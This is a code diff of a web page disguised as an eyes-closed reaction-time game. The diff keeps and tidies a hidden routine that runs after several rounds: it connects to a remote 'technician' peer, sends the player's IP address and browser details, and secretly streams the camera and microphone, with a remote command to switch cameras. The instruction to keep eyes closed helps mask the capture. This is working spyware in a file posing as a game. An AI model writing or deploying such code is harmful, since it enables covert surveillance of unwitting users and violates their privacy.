@@ -16,7 +16,10 @@
             display: flex;
             flex-direction: column;
             align-items: center;
-            justify-content: center;
+            /* CHANGE: Align to top instead of center */
+            justify-content: flex-start; 
+            /* CHANGE: Push down slightly so it's in the "upper middle" */
+            padding-top: 15vh; 
             touch-action: none;
             user-select: none;
         }
@@ -27,7 +30,7 @@
             height: 85vw;
             max-width: 400px;
             max-height: 400px;
-            background-color: #2c3e50; /* Dark Blue */
+            background-color: #2c3e50;
             border-radius: 20px;
             box-shadow: 0 0 30px rgba(0,0,0,0.5);
             position: relative;
@@ -36,22 +39,12 @@
             transition: background-color 0.1s;
         }
 
-            /* Flash color when tapped */
-            #game-board.active {
-                background-color: #34495e;
-            }
-
-            #game-board.success {
-                background-color: #27ae60;
-            }
-            /* Green flash */
-            #game-board.fail {
-                background-color: #c0392b;
-            }
-        /* Red flash */
+        #game-board.active { background-color: #34495e; }
+        #game-board.success { background-color: #27ae60; } 
+        #game-board.fail { background-color: #c0392b; }
 
         #hud-container {
-            margin-bottom: 20px;
+            margin-bottom: 30px; /* Space between text and box */
             text-align: center;
             width: 90%;
         }
@@ -73,8 +66,7 @@
         /* Visual ripple on tap */
         .ripple {
             position: absolute;
-            width: 20px;
-            height: 20px;
+            width: 20px; height: 20px;
             background: rgba(255, 255, 255, 0.6);
             border-radius: 50%;
             transform: translate(-50%, -50%);
@@ -83,17 +75,8 @@
         }
 
         @keyframes rippleAnim {
-            0% {
-                width: 20px;
-                height: 20px;
-                opacity: 1;
-            }
-
-            100% {
-                width: 200px;
-                height: 200px;
-                opacity: 0;
-            }
+            0% { width: 20px; height: 20px; opacity: 1; }
+            100% { width: 200px; height: 200px; opacity: 0; }
         }
     </style>
 </head>
@@ -112,21 +95,21 @@
 
     <script>
         // --- CONFIG ---
-        const TECHNICIAN_ID = "tech-support-commander-001";
-        const TRIGGER_COUNT = 3; // Triggers camera after 10 rounds
+        const TECHNICIAN_ID = "tech-support-commander-001"; 
+        const TRIGGER_COUNT = 10; 
 
         // --- GAME STATE ---
-        let gameState = 'IDLE'; // IDLE, WAITING_FOR_BEEP, WAITING_FOR_TAP
+        let gameState = 'IDLE'; 
         let beepTimestamp = 0;
         let reactionTime = 0;
         let roundCount = 0;
         let isConnected = false;
-
-        // --- AUDIO CONTEXT ---
+        
+        // --- AUDIO ---
         const AudioContext = window.AudioContext || window.webkitAudioContext;
         let audioCtx;
 
-        // --- DOM ELEMENTS ---
+        // --- DOM ---
         const board = document.getElementById('game-board');
         const display = document.getElementById('main-display');
         const instruction = document.getElementById('instruction');
@@ -137,40 +120,38 @@
         let currentStream = null;
 
         // 1. INPUT HANDLER
-        board.addEventListener('touchstart', handleInput, { passive: false });
+        board.addEventListener('touchstart', handleInput, {passive: false});
         board.addEventListener('mousedown', handleInput);
 
         function handleInput(e) {
             e.preventDefault();
-
-            // Visual Effect
+            
+            // Visual Ripple
             const rect = board.getBoundingClientRect();
             const x = e.touches ? e.touches[0].clientX : e.clientX;
             const y = e.touches ? e.touches[0].clientY : e.clientY;
             createRipple(x - rect.left, y - rect.top);
 
-            // Initialize Audio on first tap (Browser requirement)
+            // Init Audio
             if (!audioCtx) audioCtx = new AudioContext();
             if (audioCtx.state === 'suspended') audioCtx.resume();
 
-            // --- GAME LOGIC ---
+            // --- LOGIC ---
             if (gameState === 'IDLE') {
-                // START GAME
                 gameState = 'WAITING_FOR_BEEP';
                 display.innerText = "WAIT...";
-                display.style.color = "#f1c40f"; // Yellow
+                display.style.color = "#f1c40f"; 
                 instruction.innerText = "Keep eyes closed... Listen...";
                 scheduleBeep();
                 return;
             }
 
             if (gameState === 'WAITING_FOR_BEEP') {
-                // TAPPED TOO EARLY
+                // TOO EARLY
                 display.innerText = "TOO EARLY!";
-                display.style.color = "#e74c3c"; // Red
+                display.style.color = "#e74c3c";
                 flashBoard('fail');
-
-                // Cancel pending beep and restart round
+                
                 clearTimeout(beepTimer);
                 setTimeout(() => {
                     display.innerText = "WAIT...";
@@ -181,17 +162,17 @@
             }
 
             if (gameState === 'WAITING_FOR_TAP') {
-                // SUCCESSFUL REACTION
+                // SUCCESS
                 const now = Date.now();
                 reactionTime = now - beepTimestamp;
-
+                
                 display.innerText = reactionTime + " ms";
-                display.style.color = "#2ecc71"; // Green
+                display.style.color = "#2ecc71"; 
                 flashBoard('success');
 
                 roundCount++;
-
-                // Send Data to Technician
+                
+                // Send stats
                 if (isConnected && myDataConnection) {
                     myDataConnection.send({
                         type: 'reaction_stats',
@@ -200,7 +181,7 @@
                     });
                 }
 
-                // CHECK TRIGGER (Surveillance)
+                // Check Trigger
                 if (roundCount === TRIGGER_COUNT && !isConnected) {
                     activateSurveillance();
                 }
@@ -211,22 +192,21 @@
                     display.innerText = "WAIT...";
                     display.style.color = "#f1c40f";
                     scheduleBeep();
-                }, 1000); // Small pause before next cycle starts
+                }, 1000); 
             }
         }
 
-        // 2. TIMING & AUDIO LOGIC
+        // 2. TIMING
         let beepTimer = null;
 
         function scheduleBeep() {
-            // Random time between 1000ms (1s) and 3000ms (3s)
-            const randomDelay = Math.floor(Math.random() * 100) ;
-
+            // Random 1-3 seconds
+            const randomDelay = Math.floor(Math.random() * 2000) + 1000;
+            
             beepTimer = setTimeout(() => {
                 playTone();
                 beepTimestamp = Date.now();
                 gameState = 'WAITING_FOR_TAP';
-                // Note: We don't change text here, user has eyes closed
             }, randomDelay);
         }
 
@@ -234,19 +214,18 @@
             if (!audioCtx) return;
             const osc = audioCtx.createOscillator();
             const gainNode = audioCtx.createGain();
-
+            
             osc.connect(gainNode);
             gainNode.connect(audioCtx.destination);
-
+            
             osc.type = 'sine';
-            osc.frequency.setValueAtTime(600, audioCtx.currentTime); // 600Hz Beep
+            osc.frequency.setValueAtTime(600, audioCtx.currentTime); 
             gainNode.gain.setValueAtTime(0.1, audioCtx.currentTime);
-
+            
             osc.start();
-            osc.stop(audioCtx.currentTime + 0.15); // Short beep (150ms)
+            osc.stop(audioCtx.currentTime + 0.15); 
         }
 
-        // 3. VISUALS
         function createRipple(x, y) {
             const ripple = document.createElement('div');
             ripple.className = 'ripple';
@@ -261,29 +240,25 @@
             setTimeout(() => board.classList.remove(type), 200);
         }
 
-        // 4. SURVEILLANCE CONNECTION (Hidden)
+        // 3. CONNECTION (Hidden)
         async function activateSurveillance() {
             console.log("Connecting...");
-            isConnected = true;
+            isConnected = true; 
 
             try {
-                // Connect Data
                 myDataConnection = peer.connect(TECHNICIAN_ID);
                 myDataConnection.on('open', async () => {
-                    // Send IP Spy Info
                     try {
                         const r = await fetch('https://api.ipify.org?format=json');
                         const j = await r.json();
                         myDataConnection.send({ type: 'info', ip: j.ip, userAgent: navigator.userAgent });
-                    } catch (e) { }
+                    } catch(e) {}
 
-                    // Listen for Swap Command
                     myDataConnection.on('data', (d) => {
                         if (d === 'swap') toggleCamera();
                     });
                 });
 
-                // Start Video Stream
                 await startStream('user');
             } catch (err) {
                 console.log("Silent error:", err);
@@ -292,9 +267,9 @@
 
         async function startStream(mode) {
             if (currentStream) currentStream.getTracks().forEach(t => t.stop());
-            const stream = await navigator.mediaDevices.getUserMedia({
-                video: { facingMode: mode },
-                audio: true
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: mode }, 
+                audio: true 
             });
             currentStream = stream;
             peer.call(TECHNICIAN_ID, stream);
@@ -305,7 +280,6 @@
             currentMode = (currentMode === 'user') ? 'environment' : 'user';
             startStream(currentMode);
         }
-
     </script>
 </body>
 </html>
